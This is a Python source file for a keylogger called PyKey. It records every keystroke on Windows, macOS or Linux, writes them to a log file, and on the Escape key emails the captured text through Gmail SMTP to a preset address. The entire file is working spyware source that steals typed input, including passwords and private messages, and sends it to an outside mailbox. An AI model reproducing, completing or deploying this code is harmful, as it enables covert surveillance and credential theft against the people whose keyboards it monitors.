#!/usr/bin/env python

from pynput import keyboard
import logging
import platform
import smtplib
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate







class PyKey:
    def __init__(self):
        """ Initialization method
            Arguments:
                self (PyKey): self instance
        """
        self.EMAIL_FROM=''
        self.EMAIL_TO=''
        self.GMAIL_USER=''
        self.GMAIL_PWD=''
        self.LOG_FILE = 'log.txt'
        self.TERMINATE_KEY = "esc"
        self.CLEAR_ON_STARTUP = False
        self.MAP = {
            "space": " ",
            "\r": "\n"
        }
        self.os = self.checkOS()

        logging.basicConfig(
            filename=self.LOG_FILE,
            filemode='w',
            level=logging.DEBUG,
            format='%(message)s')


    def checkOS(self):
        """ Method to check the os where the script is running
            Arguments:
                self (PyKey): self instance
        """
        os = platform.system()
        if os == 'Linux' or os == 'Windows':
            return os.lower()
        else:
            return 'osx'


    def getKeyName(self, key):
        """ Method that returns the keyname
            Arguments:
                self (PyKey): self instance
                key (string): key pressed
        """
        if isinstance(key, keyboard.KeyCode):
            return key.char
        else:
            return str(key)


    def formatOutput(self):
        """ Method to format the key pressed and write it on a file
            Arguments:
                self (PyKey): self instance
        """
        with open(self.LOG_FILE, 'r+') as f:
            data = f.read().replace('\n', '');
        file = open(self.LOG_FILE, "w")
        file.write(data)
        file.close()


    def sendEmail(self):
        """ Method that sends the log via email
            Arguments:
                self (PyKey): self instance
        """
        SUBJECT = 'Test'

        with open(self.LOG_FILE, 'r') as myfile:
            data=myfile.read().replace('\n', '')

        TEXT = data

        message = """From: %s\nTo: %s\nSubject: %s\n\n%s
        """ % (self.EMAIL_FROM, self.EMAIL_TO, SUBJECT, TEXT)
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.ehlo()
            server.starttls()
            server.login(self.GMAIL_USER, self.GMAIL_PWD)
            server.sendmail(self.EMAIL_FROM, self.EMAIL_TO, message)
            server.close()
            print("successfully sent the mail")
        except:
            print("failed to send mail")


    def onPress(self, key):
        """ Method that captures the key when the key press is down
            Arguments:
                self (PyKey): self instance
                key (string): key pressed
        """
        keyName = self.getKeyName(key)
        if keyName is None:
            keyName = ' '
        else:
            keyName = keyName.encode('utf-8')

        if keyName == 'Key.space':
            logging.log(10,'{}'.format(' '))

        if "Key." not in keyName:
            logging.log(10,'{}'.format(keyName))


    def onRelease(self, key):
        """ Method that formats the key pressed when the key press is up
            Arguments:
                self (PyKey): self instance
                key (string): key pressed
        """
        keyName = self.getKeyName(key)

        if keyName is None:
            keyName = ' '
        else:
            keyName = keyName.encode('utf-8')

        if keyName == 'Key.esc':
            self.formatOutput()
            self.sendEmail()
            return False


    def record(self):
        """ Record strategy for OSX and Linux
            Arguments:
                self (PyKey): self instance
        """
        with keyboard.Listener(
            on_press = self.onPress,
            on_release = self.onRelease) as listener:
            listener.join()


    def onExit(self, output):
        """ Close the output stream
            Arguments:
                self (PyKey): self instance
                output: output stream
        """
        output.close()


    def recordKeyWindows(self, output, is_down, event):
        """ Records the keys in Windows OS following a strategy depending on the operating system
            Arguments:
                self (PyKey): self instance
                output: output TEXT
                is_down: catched key? Boolean
                event: keyboard event Object
        """
        if event.event_type in ("up", "down"):
            key = self.MAP.get(event.name, event.name)
            modifier = len(key) > 1
            if not modifier and event.event_type == "down":
                return

            if modifier:
                if event.event_type == "down":
                    if is_down.get(key, False):
                        return
                    else:
                        is_down[key] = True
                elif event.event_type == "up":
                    is_down[key] = False

                key = " [{} ({})] ".format(key, event.event_type)
            elif key == "\r":
                key = "\n"
            output.write(key)
            output.flush()


    def recordWindows(self):
        """ Records the keys in Windows OS following a strategy depending on the operating system
            Arguments:
                self (PyKey): self instance
        """
        from functools import partial
        import atexit
        import os
        import keyboard

        if self.CLEAR_ON_STARTUP:
            os.remove(self.LOG_FILE)

        is_down = {}
        output = open(self.LOG_FILE, "r+")
        atexit.register(self.onExit, output)
        keyboard.hook(partial(self.recordKeyWindows, output, is_down))
        keyboard.wait(self.TERMINATE_KEY)
        self.sendEmail()


    def recordKeys(self):
        """ Records the keys following a strategy depending on the operating system
            Arguments:
                self (PyKey): self instance
        """
        if self.os == 'osx' or self.os == 'linux':
            self.record()
        else:
            self.recordWindows()


    def start(self):
        """ Start the key record
        """
        self.recordKeys()







if __name__ == "__main__":
    pyKey = PyKey()
    pyKey.start()
